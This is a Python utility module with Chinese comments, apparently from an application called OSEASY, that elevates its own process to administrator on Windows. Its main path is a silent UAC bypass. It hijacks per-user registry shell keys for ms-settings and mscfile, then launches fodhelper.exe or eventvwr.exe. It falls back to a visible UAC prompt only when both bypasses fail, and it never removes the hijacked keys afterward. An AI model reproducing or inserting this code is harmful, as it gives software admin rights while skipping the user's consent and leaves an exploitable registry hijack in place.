# src/utils/uac_elevator.py
# UAC 提权模块：自动检测权限并提权（优先静默绕过，失败回退弹 UAC）
#
# 使用方式:
#   from src.utils.system.uac_elevator import elevate
#   elevate(__file__)
#
# 提权后会在环境变量 OSEASY_PRIV_METHOD 中记录方式:
#   "bypass_fodhelper" - Fodhelper 注册表绕过（静默）
#   "bypass_eventvwr"  - Eventvwr 注册表绕过（静默备选）
#   "uac_dialog"        - 标准 UAC 弹窗确认
#   "manifest"          - 打包 manifest 提权 / 原本就是管理员

import os
import sys
import ctypes

PYTHON_EXE = sys.executable
UAC_BYPASS_FLAG_FILE = "__uac_bypass__"
UAC_DIALOG_FLAG = "--uac-dialog"

# 方案 A：fodhelper.exe 绕过
FOD_HELPER = r"C:\Windows\System32\fodhelper.exe"
FOD_REG_PATH = r"Software\Classes\ms-settings\shell\open\command"

# 方案 B：eventvwr.exe 绕过（备选）
EVENTVWR = r"C:\Windows\System32\eventvwr.exe"
EVENTVWR_REG_PATH = r"Software\Classes\mscfile\shell\open\command"


def is_admin() -> bool:
    """检测当前进程是否以管理员权限运行"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _write_reg_key(reg_path: str, key: str, value: str) -> None:
    """创建/写入注册表键值"""
    import winreg
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
    registry_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE
    )
    winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
    winreg.CloseKey(registry_key)


def _try_bypass_via_registry(
    reg_path: str,
    exe_path: str,
    entry_script: str,
) -> bool:
    """
    通用注册表劫持绕过 UAC。
    原理：系统信任程序（fodhelper/eventvwr）运行时自动提权且不弹 UAC。
    修改注册表指向我们的脚本，触发它执行。
    """
    try:
        current_dir = os.path.abspath(entry_script)
        cmd = '"{}" "{}" {}'.format(PYTHON_EXE, current_dir, UAC_BYPASS_FLAG_FILE)
        _write_reg_key(reg_path, "DelegateExecute", "")
        _write_reg_key(reg_path, None, cmd)
        os.system(exe_path)
        return True
    except Exception:
        return False


def _try_bypass_fodhelper(entry_script: str) -> bool:
    """方案 A：fodhelper.exe 注册表劫持"""
    return _try_bypass_via_registry(FOD_REG_PATH, FOD_HELPER, entry_script)


def _try_bypass_eventvwr(entry_script: str) -> bool:
    """方案 B：eventvwr.exe 注册表劫持（备选）"""
    return _try_bypass_via_registry(EVENTVWR_REG_PATH, EVENTVWR, entry_script)


def _try_uac_dialog() -> None:
    """方案 C：通过 ShellExecuteW(runas) 弹出标准 UAC 提权对话框"""
    try:
        argv = " ".join(f'"{a}"' if " " in a else a for a in sys.argv)
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f"{argv} {UAC_DIALOG_FLAG}", None, 1
        )
    except Exception:
        pass


def _set_priv_method() -> None:
    """根据命令行标记设置环境变量，记录本次提权方式"""
    if not is_admin():
        return
    if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
        os.environ["OSEASY_PRIV_METHOD"] = "bypass_fodhelper"
    elif UAC_DIALOG_FLAG in sys.argv:
        os.environ["OSEASY_PRIV_METHOD"] = "uac_dialog"
    else:
        os.environ["OSEASY_PRIV_METHOD"] = "manifest"


def elevate(entry_script: str) -> None:
    """
    自动提权入口。调用后若当前非管理员：
      1. 先尝试 fodhelper 静默绕过
      2. 失败则尝试 eventvwr 静默绕过
      3. 都失败则弹 UAC

    调用方在调用后应继续正常启动逻辑。

    :param entry_script: 入口脚本路径（通常传 __file__）
    """
    if is_admin():
        _set_priv_method()
        return

    # 防止递归
    if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
        return

    # 方案 A：fodhelper 绕过
    if _try_bypass_fodhelper(entry_script):
        sys.exit(0)

    # 方案 B：eventvwr 绕过（备选）
    if _try_bypass_eventvwr(entry_script):
        sys.exit(0)

    # 方案 C：UAC 弹窗
    _try_uac_dialog()
    sys.exit(0)